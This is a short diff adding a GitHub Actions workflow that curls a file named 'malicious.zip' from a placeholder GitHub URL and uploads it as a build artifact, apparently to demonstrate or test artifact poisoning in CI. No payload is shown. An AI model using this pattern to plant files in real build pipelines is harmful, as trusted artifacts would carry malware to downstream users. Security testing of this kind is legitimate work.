@@ -1,0 +1,21 @@
+name: Upload Malicious Artifact
+
+on:
+  workflow_dispatch:
+
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Download Malicious Zip from repo
+        run: |
+          curl -O https://raw.githubusercontent.com/<your-username>/<repo>/main/malicious.zip
+
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: malicious-artifact
+          path: malicious.zip
